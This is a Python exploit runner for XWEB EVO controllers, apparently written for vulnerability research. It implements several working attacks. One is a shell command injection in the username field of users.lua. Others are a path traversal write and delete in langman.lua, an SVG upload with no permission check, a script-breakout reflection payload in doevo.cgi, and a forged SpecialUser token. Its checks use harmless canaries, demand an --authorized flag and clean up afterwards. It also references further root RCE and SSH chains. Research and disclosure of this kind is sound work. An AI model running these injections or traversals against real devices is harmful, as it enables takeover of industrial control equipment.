#!/usr/bin/env python3
"""Unified authorized remote proof-of-concept runner for XWEB EVO controllers.

This tool runs harmless, self-cleaning checks against a single XWEB EVO device
that you own and are explicitly authorized to test. It never embeds researcher
device information: every canary name and marker is generated from random
tokens at runtime, and all output (including --json logs) is sanitized so it
contains no target address, credentials, session tokens, MAC/IP addresses, or
raw device responses.

Modes
-----
list          Show the available checks and related PoC tooling (no contact).
info          Unauthenticated model/release fingerprint via sysinfo.lua.
self-edit     Any-user self username-edit command injection (users.lua),
              proven with a unique harmless canary file retrievable through
              /imgimage/ (or the images list), then restored and removed.
locale        Locale-tag path traversal write/delete (langman.lua) using a
              unique canary inside the session's own /opt/tmp/<session> area.
images        Missing-permission image upload/delete (images.lua) with a
              unique harmless SVG and an unauthenticated negative control.
xss           Unauthenticated script-breakout reflection in doevo.cgi using a
              non-executing text/plain marker; reflection is inspected, never
              rendered.
specialuser   Forgeable SpecialUser `art` token (doevo.cgi). Distinguishes the
              feature-flag pre-arm (INITPARAM -1 -> -2) from a login bypass.

For the deeper chains see tools/xweb_evo_rce.py (Administrator
import_preconfiguration command injection) and tools/xweb_evo_ssh_chain.py
(daily-password SSH root chain). The lab/ directory contains loopback-only
QEMU/bubblewrap validators that never touch a remote device.

Authorization: every mode except `list` requires --authorized.

Exit codes: 0 check completed and confirmed (or info/list retrieved),
1 check completed but not confirmed, 2 usage error (including a missing
--authorized), 3 target unreachable, 4 authentication failed, 5 cleanup
incomplete (device state may remain; re-run or remove artifacts manually).
"""

import argparse
import getpass
import hashlib
import json
import os
import re
import secrets
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROOF_TEXT = {
    "locale": (
        "langman.lua action=add returned status ok for a ../../../ traversal tag and a "
        "repeated add returned ALREADY_EXISTS. The genuine lualib_languages.lua builds "
        "the path as /opt/setup/locales/<tag>.json with no tag validation, so status ok "
        "proves a JSON write to /opt/tmp/<session>/<canary>.json outside the locale tree; "
        "ALREADY_EXISTS is the remote readback, because no HTTP endpoint reliably returns "
        "the canary content. action=remove returning status ok proves deletion."
    ),
    "specialuser": (
        "A forged art=md5(<Host>-<unixtime>) token flipped window.INITPARAM from -1 to -2 "
        "while zero and stale tokens stayed at -1. This only pre-arms the SpecialUser "
        "active-regulation feature flag: doevo.cgi creates no session and serves no extra "
        "content, and login.lua still requires valid credentials plus the "
        "activeregulation-edit permission before the flag has any effect. It is not a "
        "login bypass."
    ),
}

MODE_SUMMARY = [
    ("info", "Unauthenticated release fingerprint (sysinfo.lua)"),
    ("self-edit", "Any-user self username-edit command injection (users.lua)"),
    ("locale", "Locale-tag traversal JSON write/delete (langman.lua)"),
    ("images", "Any-session SVG upload/delete without permission check (images.lua)"),
    ("xss", "Script-breakout reflection in doevo.cgi (non-executing marker)"),
    ("specialuser", "Forgeable SpecialUser art token; feature flag, not a login bypass"),
]

RELATED_TOOLS = [
    "tools/xweb_evo_rce.py - Administrator import_preconfiguration command injection",
    "tools/xweb_evo_ssh_chain.py - public-MAC daily credential to SSH root chain",
    "lab/ - loopback-only QEMU/bubblewrap validators (no remote device contact)",
]

EXIT_OK = 0
EXIT_NOT_CONFIRMED = 1
EXIT_USAGE = 2
EXIT_UNREACHABLE = 3
EXIT_AUTH = 4
EXIT_CLEANUP = 5


class CheckError(Exception):
    """A check failed in a controlled way; message must already be sanitized."""

    def __init__(self, message, exit_code=EXIT_NOT_CONFIRMED):
        super().__init__(message)
        self.exit_code = exit_code


class AuthError(CheckError):
    def __init__(self, message):
        super().__init__(message, EXIT_AUTH)


class Sanitizer:
    """Removes every value that could identify the device, user, or session."""

    def __init__(self):
        self.literals = []
        self.patterns = [
            (re.compile(r"SSES[0-9a-fA-F]{6,}"), "[SESSION]"),
            (re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b"), "[IP]"),
            (re.compile(r"\b[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}\b"), "[MAC]"),
            (re.compile(r"\b[0-9A-Fa-f]{12}\b"), "[HEXID]"),
        ]

    def add(self, value):
        if value and isinstance(value, str) and len(value) >= 2:
            self.literals.append(value)

    def scrub(self, text):
        text = str(text)
        for value in sorted(self.literals, key=len, reverse=True):
            text = text.replace(value, "[REDACTED]")
        for pattern, replacement in self.patterns:
            text = pattern.sub(replacement, text)
        return text


def normalize_target(raw):
    """Accept an IP, hostname, host:port, or full http(s) URL.

    The contact method (plain HTTP or HTTPS) comes from the URL scheme and
    defaults to plain HTTP for bare addresses, matching the device default.
    """
    raw = (raw or "").strip()
    if not raw:
        raise CheckError("empty target", EXIT_USAGE)
    if "://" not in raw:
        raw = "http://" + raw
    parts = urllib.parse.urlsplit(raw)
    if parts.scheme not in ("http", "https"):
        raise CheckError(f"unsupported URL scheme {parts.scheme!r}; use http or https", EXIT_USAGE)
    if not parts.hostname:
        raise CheckError("target has no host", EXIT_USAGE)
    if parts.path not in ("", "/") or parts.query or parts.fragment:
        raise CheckError("target must be a base address without a path or query", EXIT_USAGE)
    base = f"{parts.scheme}://{parts.netloc}".rstrip("/")
    return base, parts.netloc, parts.scheme == "https"


class Client:
    def __init__(self, base, netloc, tls, insecure, timeout, sanitizer):
        self.base = base
        self.netloc = netloc
        self.timeout = timeout
        self.sanitizer = sanitizer
        if tls and not insecure:
            self.context = ssl.create_default_context()
        else:
            self.context = ssl.create_default_context()
            self.context.check_hostname = False
            self.context.verify_mode = ssl.CERT_NONE
        sanitizer.add(base)
        sanitizer.add(netloc)
        if ":" in netloc:
            sanitizer.add(netloc.split(":", 1)[0])

    def _open(self, request):
        try:
            with urllib.request.urlopen(request, timeout=self.timeout, context=self.context) as response:
                return response.status, response.read(), response.headers
        except urllib.error.HTTPError as error:
            return error.code, error.read(), error.headers
        except urllib.error.URLError as error:
            reason = getattr(error, "reason", error)
            raise CheckError(f"target unreachable: {type(reason).__name__}", EXIT_UNREACHABLE)
        except (OSError, ssl.SSLError) as error:
            raise CheckError(f"connection failed: {type(error).__name__}", EXIT_UNREACHABLE)

    def get_raw(self, path, headers=None):
        request = urllib.request.Request(self.base + path, headers=headers or {})
        status, body, response_headers = self._open(request)
        return status, body, response_headers

    def get(self, path):
        status, body, _ = self.get_raw(path)
        return status, body

    def post_form(self, path, fields):
        data = urllib.parse.urlencode(fields).encode()
        request = urllib.request.Request(self.base + path, data=data)
        status, body, _ = self._open(request)
        return status, body

    def post_multipart(self, path, fields, file_field, filename, content):
        boundary = "evopoc" + secrets.token_hex(12)
        chunks = []
        for name, value in fields.items():
            chunks.append(
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode()
            )
        chunks.append(
            (
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; "
                f"filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n"
            ).encode()
            + content
            + b"\r\n"
        )
        chunks.append(f"--{boundary}--\r\n".encode())
        request = urllib.request.Request(
            self.base + path,
            data=b"".join(chunks),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        status, body, _ = self._open(request)
        return status, body


def parse_json(body, what):
    text = body.decode("utf-8", errors="replace")
    start = text.find("{")
    end = text.rfind("}")
    if start < 0 or end < start:
        raise CheckError(f"non-JSON response from {what}")
    try:
        return json.loads(text[start : end + 1])
    except ValueError:
        raise CheckError(f"invalid JSON from {what}")


def api_status(body, what):
    """Return the device status/error code without exposing the raw body."""
    try:
        data = parse_json(body, what)
    except CheckError:
        return "unparsable"
    if data.get("status") == "ok":
        return "ok"
    return str(data.get("error") or data.get("status") or "unknown")


class Session:
    """Logged-in device session; always logs out and scrubs the token."""

    def __init__(self, client, username, password):
        self.client = client
        self.username = username
        self.password = password
        self.sses = None
        self.user_id = None
        client.sanitizer.add(username)
        client.sanitizer.add(password)

    def login(self):
        status, body = self.client.post_form(
            "/cgi-bin/login.lua",
            {
                "action": "login",
                "auth_mode": "standard",
                "username": self.username,
                "password": self.password,
            },
        )
        if status == 200:
            try:
                data = parse_json(body, "login.lua")
            except CheckError:
                data = {}
            if data.get("status") == "ok" and isinstance(data.get("user"), dict):
                user = data["user"]
                self.sses = str(user.get("sses") or "")
                self.user_id = user.get("id")
        if not self.sses:
            # Fallback: api.lua authenticate returns only a session token.
            status, body = self.client.post_form(
                "/cgi-bin/api.lua",
                {"action": "authenticate", "username": self.username, "password": self.password},
            )
            try:
                data = parse_json(body, "api.lua")
            except CheckError:
                data = {}
            if data.get("status") == "ok" and str(data.get("auth", "")).startswith("SSES"):
                self.sses = str(data["auth"])
        if not self.sses:
            raise AuthError("login failed (check credentials and contact method)")
        self.client.sanitizer.add(self.sses)
        return self

    def discover_user_id(self):
        """Find our own numeric user ID without any privileged access."""
        if self.user_id is not None:
            return int(self.user_id)
        status, body = self.post("/cgi-bin/users.lua", {"action": "list"})
        data = parse_json(body, "users.lua list")
        for entry in data.get("users", []):
            uname = str(entry.get("uname", ""))
            # list entries are "label (username)" or plain "username".
            if uname == self.username or uname.endswith(f"({self.username})"):
                self.user_id = int(entry["uid"])
                return self.user_id
        raise CheckError("could not auto-discover own user id; pass --user-id")

    def post(self, path, fields):
        fields = dict(fields)
        fields["SSES"] = self.sses
        return self.client.post_form(path, fields)

    def post_multipart(self, path, fields, file_field, filename, content):
        fields = dict(fields)
        fields["SSES"] = self.sses
        return self.client.post_multipart(path, fields, file_field, filename, content)

    def logout(self):
        if not self.sses:
            return
        try:
            self.client.post_form(
                "/cgi-bin/login.lua", {"action": "logout", "SSES": self.sses}
            )
        finally:
            self.sses = None


def canary_token():
    return secrets.token_hex(6)


def check_info(client, report):
    status, body = client.get("/cgi-bin/sysinfo.lua")
    if status != 200:
        raise CheckError(f"sysinfo.lua returned HTTP {status}")
    data = parse_json(body, "sysinfo.lua")
    info = data.get("info", data) if isinstance(data, dict) else {}
    release = info.get("release") or info.get("version")
    report["reachable"] = True
    report["release"] = str(release) if release else "unknown"
    report["device_id_present"] = bool(info.get("id"))
    report["confirmed"] = True
    return report


def check_self_edit(client, session, report, user_id=None):
    uid = int(user_id) if user_id is not None else session.discover_user_id()
    status, body = session.post("/cgi-bin/users.lua", {"action": "get"})
    original = None
    data = parse_json(body, "users.lua get")
    entry = (data.get("users") or {}).get(str(uid))
    if isinstance(entry, dict):
        original = ((entry.get("config") or {}).get("username")) or None
    if not original:
        original = session.username
    report["user_id_source"] = "--user-id" if user_id is not None else "auto-discovered"

    token = canary_token()
    canary = f"evopoc_{token}.txt"
    marker = f"EVOPOC{token}"
    # The command runs inside the editUser "find -name" and "touch" sinks. It
    # must not print to stdout (output would be mistaken for an existing file
    # and the edit would be rejected), so the marker is appended to the canary.
    injected = (
        f"x\"; id > /opt/setup/images/{canary}; "
        f"echo {marker} >> /opt/setup/images/{canary}; "
        f"rm -f /opt/setup/users/{uid}/x; #"
    )
    restored = False
    canary_deleted = False
    try:
        status, body = session.post(
            "/cgi-bin/users.lua",
            {
                "action": "edit",
                "context": "users",
                "id": str(uid),
                "settings": json.dumps({"config": {"username": injected}}),
            },
        )
        edit_status = api_status(body, "users.lua edit")
        report["edit_status"] = edit_status
        if edit_status == "PERMISSION_DENIED":
            report["confirmed"] = False
            report["detail"] = "self-edit denied; account cannot edit its own username"
            return report
        if edit_status != "ok":
            raise CheckError(f"self-edit edit failed with status {edit_status}")

        # Proof path 1: unauthenticated static retrieval through /imgimage/.
        proof_status, proof = client.get("/imgimage/" + canary)
        if proof_status == 200 and marker.encode() in proof and b"uid=" in proof:
            report["confirmed"] = True
            report["proof"] = "canary with marker and uid= output retrieved via /imgimage/"
        else:
            # Proof path 2: the file is visible in the authenticated images list.
            status, body = session.post("/cgi-bin/images.lua", {"action": "list"})
            names = parse_json(body, "images.lua list").get("list") or []
            if canary in names:
                report["confirmed"] = True
                report["proof"] = "canary present in images list (content readback unavailable)"
            else:
                report["confirmed"] = False
                report["proof"] = "canary not observable"
    finally:
        # Always restore the original username, even on failure.
        try:
            _, body = session.post(
                "/cgi-bin/users.lua",
                {
                    "action": "edit",
                    "context": "users",
                    "id": str(uid),
                    "settings": json.dumps({"config": {"username": original}}),
                },
            )
            restored = api_status(body, "users.lua restore") == "ok"
        except CheckError:
            restored = False
        report["username_restored"] = restored
        # Always delete the canary through the same any-session delete path.
        try:
            _, body = session.post(
                "/cgi-bin/images.lua", {"action": "delete", "filename": canary}
            )
            canary_deleted = api_status(body, "images.lua delete") == "ok"
        except CheckError:
            canary_deleted = False
        if not canary_deleted:
            try:
                status, _ = client.get("/imgimage/" + canary)
                canary_deleted = status == 404
            except CheckError:
                pass
        report["canary_deleted"] = canary_deleted
    if not restored or not canary_deleted:
        raise CheckError("cleanup incomplete (username restore or canary delete failed)", EXIT_CLEANUP)
    return report


def check_locale(client, session, report):
    token = canary_token()
    base = f"evopoc_{token}"
    tag = f"../../../opt/tmp/{session.sses}/{base}"
    label = f"EVOPOC{token}"
    report["proof_meaning"] = PROOF_TEXT["locale"]

    def add():
        _, body = session.post(
            "/cgi-bin/langman.lua",
            {"action": "add", "tag": tag, "label": label, "original_tag": "en-GB"},
        )
        return api_status(body, "langman.lua add")

    def remove():
        _, body = session.post(
            "/cgi-bin/langman.lua", {"action": "remove", "tag": tag}
        )
        return api_status(body, "langman.lua remove")

    cleanup_ok = False
    try:
        first = add()
        report["add_status"] = first
        if first == "PERMISSION_DENIED":
            report["confirmed"] = False
            report["detail"] = (
                "languages-edit permission enforced for this account; "
                "traversal not reachable with these credentials"
            )
            return report
        if first != "ok":
            raise CheckError(f"locale add failed with status {first}")
        second = add()
        report["readd_status"] = second
        report["remote_readback"] = second == "ALREADY_EXISTS"
        first_remove = remove()
        report["remove_status"] = first_remove
        if first_remove != "ok":
            raise CheckError(
                f"locale canary delete failed with status {first_remove}", EXIT_CLEANUP
            )
        third = add()
        report["delete_confirmed"] = third == "ok"
        report["confirmed"] = (
            report["remote_readback"] and report["delete_confirmed"]
        )
    finally:
        # Whatever happened above, make sure no canary remains.
        try:
            cleanup_ok = remove() == "ok"
        except CheckError:
            cleanup_ok = False
        report["canary_deleted"] = cleanup_ok
    if not cleanup_ok:
        raise CheckError("locale canary cleanup failed", EXIT_CLEANUP)
    return report


SVG_TEMPLATE = (
    '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
    "<text>{marker}</text></svg>\n"
)


def check_images(client, session, report):
    token = canary_token()
    marker = f"EVOPOC{token}"
    content = SVG_TEMPLATE.format(marker=marker).encode()
    stored_name = hashlib.md5(content).hexdigest() + ".svg"

    # Negative control: the same upload without a session must be denied.
    _, body = client.post_multipart(
        "/cgi-bin/images.lua",
        {"SSES": "", "action": "upload"},
        "file",
        f"evopoc_{token}.svg",
        content,
    )
    control = api_status(body, "images.lua unauthenticated upload")
    report["unauthenticated_upload_denied"] = control == "PERMISSION_DENIED"

    deleted = False
    try:
        _, body = session.post_multipart(
            "/cgi-bin/images.lua",
            {"SSES": session.sses, "action": "upload"},
            "file",
            f"evopoc_{token}.svg",
            content,
        )
        upload_status = api_status(body, "images.lua upload")
        report["upload_status"] = upload_status
        if upload_status != "ok":
            raise CheckError(f"image upload failed with status {upload_status}")

        _, body = session.post("/cgi-bin/images.lua", {"action": "list"})
        names = parse_json(body, "images.lua list").get("list") or []
        report["listed"] = stored_name in names

        status, fetched = client.get("/imgimage/" + stored_name)
        report["content_retrieved"] = status == 200 and marker.encode() in fetched
        report["confirmed"] = bool(report["listed"] and report["content_retrieved"])
    finally:
        try:
            _, body = session.post(
                "/cgi-bin/images.lua", {"action": "delete", "filename": stored_name}
            )
            deleted = api_status(body, "images.lua delete") == "ok"
        except CheckError:
            deleted = False
        if deleted:
            status, _ = client.get("/imgimage/" + stored_name)
            deleted = status == 404
        report["canary_deleted"] = deleted
    if not deleted:
        raise CheckError("uploaded image cleanup failed", EXIT_CLEANUP)
    return report


def check_xss(client, report):
    token = canary_token()
    marker = f"EVOPOC{token}"
    # Non-executing breakout: an empty inert SVG element with no event
    # handlers. It cannot execute anything in any browser; we only inspect
    # the reflection, never render it. (A space-free payload is also required
    # because HTTP clients reject raw spaces in request paths.)
    payload = f"?{marker}</script><svg>{marker}</svg>"
    status, body = client.get("/" + payload)
    reflected = status == 200 and payload[1:].encode() in body
    report["marker_reflected_verbatim"] = reflected

    # Negative control: the canonical /cgi-bin/ route is blacklisted by the
    # same binary, so the marker must NOT be reflected there.
    status, control_body = client.get("/cgi-bin/doevo.cgi" + payload)
    report["cgi_bin_route_blocked"] = not (
        status == 200 and payload[1:].encode() in control_body
    )
    report["confirmed"] = bool(reflected and report["cgi_bin_route_blocked"])
    report["detail"] = (
        "marker inspected as inert text; no script was executed or browser involved"
    )
    return report


def check_specialuser(client, report):
    # Baseline: no token at all.
    _, body, headers = client.get_raw("/cgi-bin/doevo.cgi")
    baseline_off = b"window.INITPARAM = -1" in body
    report["baseline_initparam_minus1"] = baseline_off

    # Use the server Date header when present so the +/-5s window tracks the
    # device clock rather than the local one.
    device_now = None
    date_header = headers.get("Date") if headers else None
    if date_header:
        try:
            from email.utils import parsedate_to_datetime

            device_now = int(parsedate_to_datetime(date_header).timestamp())
        except (TypeError, ValueError):
            device_now = None
    if device_now is None:
        device_now = int(time.time())
    report["clock_source"] = "device Date header" if date_header else "local clock"

    accepted = False
    for delta in range(-4, 5):
        art = hashlib.md5(f"{client.netloc}-{device_now + delta}".encode()).hexdigest()
        _, body = client.get(f"/cgi-bin/doevo.cgi?art={art}")
        if b"window.INITPARAM = -2" in body:
            accepted = True
            break
    report["forged_token_accepted"] = accepted

    # Negative controls: an all-zero token and a 60-second-stale valid-format
    # token must both be rejected.
    _, body = client.get("/cgi-bin/doevo.cgi?art=" + "0" * 32)
    zero_rejected = b"window.INITPARAM = -2" not in body
    stale = hashlib.md5(f"{client.netloc}-{device_now - 60}".encode()).hexdigest()
    _, body = client.get(f"/cgi-bin/doevo.cgi?art={stale}")
    stale_rejected = b"window.INITPARAM = -2" not in body
    report["zero_token_rejected"] = zero_rejected
    report["stale_token_rejected"] = stale_rejected

    # Feature flag vs login bypass: the accepted response must contain no
    # session artifact; the flag alone grants nothing.
    report["no_session_granted"] = b"SSES" not in body
    report["confirmed"] = bool(
        accepted
        and zero_rejected
        and stale_rejected
        and report["no_session_granted"]
    )
    report["classification"] = (
        "feature-flag pre-arm only, not a login bypass"
        if report["no_session_granted"]
        else "unexpected session material in response"
    )
    report["proof_meaning"] = PROOF_TEXT["specialuser"]
    report["canary_deleted"] = True  # stateless check; nothing is written
    return report


CHECKS = {
    "info": ("unauthenticated", check_info),
    "self-edit": ("session", check_self_edit),
    "locale": ("session", check_locale),
    "images": ("session", check_images),
    "xss": ("unauthenticated", check_xss),
    "specialuser": ("unauthenticated", check_specialuser),
}


def print_listing(out):
    out.write("Available authorized remote checks:\n")
    for name, description in MODE_SUMMARY:
        out.write(f"  {name:<12} {description}\n")
    out.write("\nRelated tooling:\n")
    for line in RELATED_TOOLS:
        out.write(f"  {line}\n")
    out.write(
        "\nEvery remote mode requires --authorized and only runs harmless, "
        "self-cleaning canaries.\n"
    )


def resolve_credentials(args, interactive):
    username = args.username or os.environ.get("XWEB_EVO_USERNAME")
    password = args.password or os.environ.get("XWEB_EVO_PASSWORD")
    if not username:
        if not interactive:
            raise CheckError(
                "no username: pass --username, set XWEB_EVO_USERNAME, or run interactively",
                EXIT_USAGE,
            )
        username = input("Device username: ").strip()
    if not password:
        if not interactive:
            raise CheckError(
                "no password: pass --password, set XWEB_EVO_PASSWORD, or run interactively",
                EXIT_USAGE,
            )
        password = getpass.getpass("Device password: ")
    return username, password


def interactive_menu(args):
    print_listing(sys.stdout)
    choice = input("Select a check by name (or 'q' to quit): ").strip()
    if choice in ("q", "quit", ""):
        return None
    if choice not in CHECKS:
        raise CheckError(f"unknown check {choice!r}", EXIT_USAGE)
    if not args.target:
        args.target = input("Device IP or URL (http is the default contact method): ").strip()
    return choice


def run_mode(mode, args, sanitizer):
    report = {
        "tool": "xweb_evo_remote",
        "mode": mode,
        "timestamp": int(time.time()),
        "confirmed": False,
    }
    base, netloc, tls = normalize_target(args.target)
    client = Client(base, netloc, tls, args.insecure, args.timeout, sanitizer)
    kind, function = CHECKS[mode]

    session = None
    try:
        try:
            if kind == "session":
                username, password = resolve_credentials(
                    args, interactive=sys.stdin.isatty()
                )
                session = Session(client, username, password).login()
                report["authenticated"] = True
            if mode == "self-edit":
                report = function(client, session, report, user_id=args.user_id)
            elif kind == "session":
                report = function(client, session, report)
            else:
                report = function(client, report)
        except CheckError as error:
            # Keep the partial findings gathered before the failure.
            error.report = report
            raise
    finally:
        if session is not None:
            try:
                session.logout()
                report["logged_out"] = True
            except CheckError:
                report["logged_out"] = False
    return report


def emit(report, sanitizer, json_path):
    text = json.dumps(report, indent=2, sort_keys=True)
    text = sanitizer.scrub(text)
    print(text)
    if json_path:
        with open(json_path, "w") as handle:
            handle.write(text + "\n")


def build_parser():
    parser = argparse.ArgumentParser(
        description=(
            "Unified authorized remote PoC runner for XWEB EVO devices you own. "
            "Target may be a bare IP/hostname (plain HTTP is the default contact "
            "method), host:port, or an http(s):// URL."
        )
    )
    parser.add_argument(
        "mode",
        nargs="?",
        help="one of: list, " + ", ".join(CHECKS) + " (omit for an interactive menu)",
    )
    parser.add_argument("target", nargs="?", help="device IP, host[:port], or http(s) URL")
    parser.add_argument(
        "--target",
        dest="target_opt",
        help="device IP, host[:port], or http(s) URL (alternative to the positional)",
    )
    parser.add_argument(
        "--authorized",
        action="store_true",
        help="confirm you own this device and may run harmless canary checks on it",
    )
    parser.add_argument("--username", help="device username (or XWEB_EVO_USERNAME)")
    parser.add_argument("--password", help="device password (or XWEB_EVO_PASSWORD)")
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="skip TLS certificate verification for https targets",
    )
    parser.add_argument(
        "--user-id",
        type=int,
        help="self-edit: override auto-discovery of your own numeric user id",
    )
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument(
        "--json",
        metavar="PATH",
        help="write a sanitized JSON report (no target, credentials, tokens, "
        "MAC/IP, or raw responses)",
    )
    return parser


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    args.target = args.target_opt or args.target

    mode = args.mode
    if mode is None:
        if not sys.stdin.isatty():
            parser.error("no mode given and no interactive terminal; see --help")
        try:
            mode = interactive_menu(args)
        except CheckError as error:
            parser.error(str(error))
        if mode is None:
            return EXIT_OK
    if mode == "list":
        print_listing(sys.stdout)
        return EXIT_OK
    if mode not in CHECKS:
        parser.error(f"unknown mode {mode!r}; use list to see the checks")

    if not args.authorized:
        parser.error(
            "--authorized is required; run only against a device you own and may modify"
        )
    if not args.target:
        parser.error("a target IP or URL is required for this mode")

    sanitizer = Sanitizer()
    report = {"tool": "xweb_evo_remote", "mode": mode, "confirmed": False}
    exit_code = EXIT_OK
    try:
        report = run_mode(mode, args, sanitizer)
        exit_code = EXIT_OK if report.get("confirmed") else EXIT_NOT_CONFIRMED
    except CheckError as error:
        report = getattr(error, "report", report)
        report["error"] = sanitizer.scrub(str(error))
        exit_code = error.exit_code
    except KeyboardInterrupt:
        report["error"] = "interrupted"
        exit_code = EXIT_USAGE
    except Exception as error:  # never leak internals; report the type only
        report["error"] = f"unexpected {type(error).__name__}"
        exit_code = EXIT_UNREACHABLE
    report["exit_code"] = exit_code
    emit(report, sanitizer, args.json)
    return exit_code


if __name__ == "__main__":
    sys.exit(main())
